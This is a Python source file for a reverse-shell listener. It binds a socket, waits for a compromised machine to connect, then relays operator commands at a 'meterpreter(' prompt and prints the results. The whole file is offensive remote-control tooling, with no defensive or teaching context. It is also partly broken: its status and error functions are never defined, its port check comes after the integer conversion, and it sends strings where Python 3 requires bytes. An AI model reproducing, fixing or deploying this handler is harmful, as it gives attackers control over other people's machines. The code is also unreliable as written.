import os
import sys
import socket
import time

def socketCreate():
    try:
        global host
        global port
        global s

        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        using = '\33[91musing\33[00m(\33[92;1mlistener\33[00m) '
        host = input(using + 'host<( ')
        port = int(input(using + 'port<( '))
        if port == '':
            socketCreate()

    except:
        print_error('Error occurred')

def socketBind():
    try:
        print_status('Listening on port ' + str(port))
        s.bind((host,port))
        s.listen(1)
    except:
        print_error('binding error')
        print('retrying..')
        time.sleep(3)
        socketBind()

def socketAccept():
    global conn
    global addr
    global hostname

    try:
        conn, addr = s.accept()
        print_success('Sessions Opened | ' + 'IP :\33[92m ' + addr[0] + '\33[00m | Port : \33[92m' + str(addr[1])+'\33[00m\n')
        
    except:
        print_error('Failed to accept connections ')

def menu():
    while True:
        cmd = input('meterpreter( ')
        if cmd == 'quit':
            conn.close()
            sys.exit()

        command = conn.send(cmd)
        result = conn.recv(16834)
        print(result)
        

def listener():
    socketCreate()
    socketBind()
    socketAccept()
    menu()

    

